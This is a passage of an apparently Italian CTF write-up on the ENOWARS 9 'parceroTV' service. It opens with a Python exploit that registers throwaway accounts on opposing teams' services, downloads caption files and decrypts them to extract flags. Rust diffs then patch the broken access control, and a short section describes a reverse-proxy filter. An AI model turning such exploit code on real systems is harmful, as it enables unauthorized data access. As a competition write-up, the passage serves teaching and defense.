</span></span><span class="line"><span class="cl">    <span class="n">full_text</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">text_lines</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">full_text</span><span class="o">.</span><span class="n">split</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="n">TEAM_IP</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">service_name</span> <span class="o">=</span> <span class="s1">&#39;parceroTV&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">attacksjson</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;https://9.enowars.com/scoreboard/attack.json&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;services&#39;</span><span class="p">][</span><span class="n">service_name</span><span class="p">][</span><span class="n">TEAM_IP</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">URL</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;http://</span><span class="si">{</span><span class="n">TEAM_IP</span><span class="si">}</span><span class="s1">:7777&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">rnd</span> <span class="ow">in</span> <span class="n">attacksjson</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">vtt_file</span> <span class="o">=</span> <span class="n">rnd</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;1&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">username</span><span class="p">,</span> <span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">)),</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">choices</span><span class="p">(</span><span class="n">alph</span><span class="p">,</span> <span class="n">k</span><span class="o">=</span><span class="mi">12</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/newuser&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/checkcredentials&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span> <span class="s1">&#39;password&#39;</span><span class="p">:</span> <span class="n">password</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="s1">&#39;/get_shorts&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="n">vtt_file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">c</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="s1">&#39;caption_path&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">c</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">vtt_raw</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">URL</span> <span class="o">+</span> <span class="n">c</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
</span></span><span class="line"><span class="cl">        <span class="n">encrypted</span> <span class="o">=</span> <span class="n">extract_vtt_text</span><span class="p">(</span><span class="n">vtt_raw</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">durations</span> <span class="o">=</span> <span class="p">[</span><span class="mf">4.6</span><span class="p">,</span> <span class="mf">2.5</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">durations</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">f</span> <span class="o">=</span> <span class="n">decrypt_spanish_stream</span><span class="p">(</span><span class="n">encrypted</span><span class="p">,</span> <span class="n">d</span><span class="p">,</span> <span class="n">words_file</span><span class="o">=</span><span class="s2">&#34;spanish_words.txt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">)</span> <span class="ow">and</span> <span class="n">f</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;@&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">brainfuck</span><span class="p">(</span><span class="n">f</span><span class="p">),</span> <span class="n">flush</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span></code></pre></div><h3 id="patch">Patch<a hidden class="anchor" aria-hidden="true" href="#patch">#</a></h3>
<p>Le modifiche git in staging mostrano che la vulnerabilit√† di Broken Access Control √® stata corretta in <code>backend/src/main.rs</code>.</p>
<ol>
<li>
<p><strong>Correzione per l‚Äôaccesso ai video privati</strong>: la funzione <code>get_private_videos_by_userid</code> √® stata modificata per includere un controllo di autorizzazione essenziale. Ora confronta il <code>user_id</code> della sessione con quello nell‚ÄôURL. Se non corrispondono, la richiesta viene respinta.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gd">--- a/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gi">+++ b/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gu">@@ -654,8 +654,11 @@ async fn get_private_videos_by_userid(
</span></span></span><span class="line"><span class="cl">     pool: web::Data&lt;Pool&gt;,
</span></span><span class="line"><span class="cl">     user_id: web::Path&lt;i32&gt;,
</span></span><span class="line"><span class="cl"> ) -&gt; Result&lt;impl Responder, Error&gt; {
</span></span><span class="line"><span class="cl">     if let Ok(Some(_user_id)) = session.get::&lt;i32&gt;(&#34;user_id&#34;) {
</span></span><span class="line"><span class="cl"><span class="gd">-        let conn = get_db_conn(&amp;pool).await?;
</span></span></span><span class="line"><span class="cl">         let user_id = user_id.into_inner();
</span></span><span class="line"><span class="cl"><span class="gi">+        if _user_id != user_id {
</span></span></span><span class="line"><span class="cl"><span class="gi">+            return Ok(redirect!(&#34;/no_permission&#34;));
</span></span></span><span class="line"><span class="cl"><span class="gi">+        }
</span></span></span><span class="line"><span class="cl"><span class="gi">+        let conn = get_db_conn(&amp;pool).await?;
</span></span></span><span class="line"><span class="cl">         let videoss = web::block(move || select_private_videos_by_userid(conn, user_id))
</span></span><span class="line"><span class="cl">             .await?
</span></span><span class="line"><span class="cl">             .map_err(error::ErrorInternalServerError)?;
</span></span></code></pre></div></li>
<li>
<p><strong>Defesa-in-depth per le informazioni video</strong>: un controllo analogo √® stato aggiunto all‚Äôendpoint <code>/get_video_info/{path:.*}</code>. Questa patch garantisce che solo il proprietario di un video possa ottenere i suoi metadati dettagliati, prevenendo ulteriori fughe di informazioni anche se un attaccante trovasse un‚Äôaltra via per accedere al percorso del video.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gd">--- a/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gi">+++ b/backend/src/main.rs
</span></span></span><span class="line"><span class="cl"><span class="gu">@@ -738,6 +741,9 @@ async fn get_video_info(
</span></span></span><span class="line"><span class="cl">         let video_info = web::block(move || select_video_by_path(conn, &amp;path))
</span></span><span class="line"><span class="cl">             .await?
</span></span><span class="line"><span class="cl">             .map_err(error::ErrorInternalServerError)?;
</span></span><span class="line"><span class="cl"><span class="gi">+            if video_info.userId != user_id {
</span></span></span><span class="line"><span class="cl"><span class="gi">+                return Ok(redirect!(&#34;/no_permission&#34;));
</span></span></span><span class="line"><span class="cl"><span class="gi">+            }
</span></span></span><span class="line"><span class="cl">         Ok(HttpResponse::Ok().json(video_info))
</span></span><span class="line"><span class="cl">     }
</span></span><span class="line"><span class="cl"> } else {
</span></span></code></pre></div></li>
</ol>
<p>Non sono state trovate patch negli staged changes per la vulnerabilit√† di crittografia insicura nel sistema di didascalie degli shorts, il che suggerisce che potrebbe essere stata trascurata o prevista in un commit successivo.</p>
<h3 id="difesa-a-livello-di-rete">Difesa a livello di rete<a hidden class="anchor" aria-hidden="true" href="#difesa-a-livello-di-rete">#</a></h3>
<p>Oltre alle patch a livello di codice, √® stata implementata una difesa a livello di rete. Abbiamo configurato il reverse proxy per ispezionare le richieste HTTP in arrivo. Identificando il <code>User-Agent</code> e altri header specifici utilizzati dal checker del gioco, abbiamo creato una regola di filtraggio. Qualsiasi richiesta al servizio che non corrispondesse al profilo di header del checker veniva bloccata. Questo ha mitigato efficacemente attacchi semplici automatizzati, costringendo gli avversari a costruire exploit pi√π sofisticati in grado di emulare correttamente il traffico del checker, come dimostrato dagli header <code>User-Agent</code> presenti negli script di exploit forniti.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://albovo.github.io/it/tags/attack-defense/">Attack-Defense</a></li>
      <li><a href="https://albovo.github.io/it/tags/ctf/">Ctf</a></li>
      <li><a href="https://albovo.github.io/it/tags/crypto/">Crypto</a></li>
      <li><a href="https://albovo.github.io/it/tags/web/">Web</a></li>
      <li><a href="https://albovo.github.io/it/tags/enowars/">Enowars</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://albovo.github.io/it/ctf/scriptctf2025/">
    <span class="title">¬´ Precedente</span>
    <br>
    <span>scriptCTF 2025</span>
  </a>
  <a class="next" href="https://albovo.github.io/it/ctf/ulissectf2025/">
    <span class="title">Successivo ¬ª</span>
    <br>
    <span>UlisseCTF 2025</span>
  </a>
</nav>


<ul class="share-buttons">
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on x"
            href="https://x.com/intent/tweet/?text=ENOWARS%209&amp;url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f&amp;hashtags=attack-defense%2cctf%2ccrypto%2cweb%2cenowars">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on linkedin"
            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f&amp;title=ENOWARS%209&amp;summary=ENOWARS%209&amp;source=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on reddit"
            href="https://reddit.com/submit?url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f&title=ENOWARS%209">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on facebook"
            href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on whatsapp"
            href="https://api.whatsapp.com/send?text=ENOWARS%209%20-%20https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f">
            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
                <path
                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on telegram"
            href="https://telegram.me/share/url?text=ENOWARS%209&amp;url=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f">
            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
                <path
                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
            </svg>
        </a>
    </li>
    <li>
        <a target="_blank" rel="noopener noreferrer" aria-label="share ENOWARS 9 on ycombinator"
            href="https://news.ycombinator.com/submitlink?t=ENOWARS%209&u=https%3a%2f%2falbovo.github.io%2fit%2fctf%2fenowars2025%2f">
            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
                <path
                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
            </svg>
        </a>
    </li>
</ul>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://albovo.github.io/it/">Portfolio</a></span> ¬∑ 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
